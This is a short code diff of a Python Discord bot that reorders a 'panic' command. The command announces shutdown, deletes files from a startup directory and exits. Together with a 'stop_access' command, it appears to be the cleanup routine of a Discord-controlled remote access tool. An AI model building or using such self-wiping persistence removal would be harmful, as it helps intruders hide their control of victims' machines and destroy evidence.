@@ -107,10 +107,8 @@ async def stop_access(ctx):
 @client.command()
 @commands.cooldown(1, 5, commands.BucketType.category)
 async def panic(ctx):
-    await ctx.send("Panic mode activated! Stopping access...")
-    
     global stop
-    stop = True
+    await ctx.send("Panic mode activated! Stopping access...")
     
     await ctx.send("The system will close, and the files will be deleted in the background after a 10 seconds countdown.")
     
@@ -125,7 +123,10 @@ async def panic(ctx):
     for file in files_to_delete:
         os.remove(f"{startup_directory}\\{file}")
     await ctx.send("System closed.")
+    stop = True
     exit()
+    quit()
+    return
 
 
 @client.command()
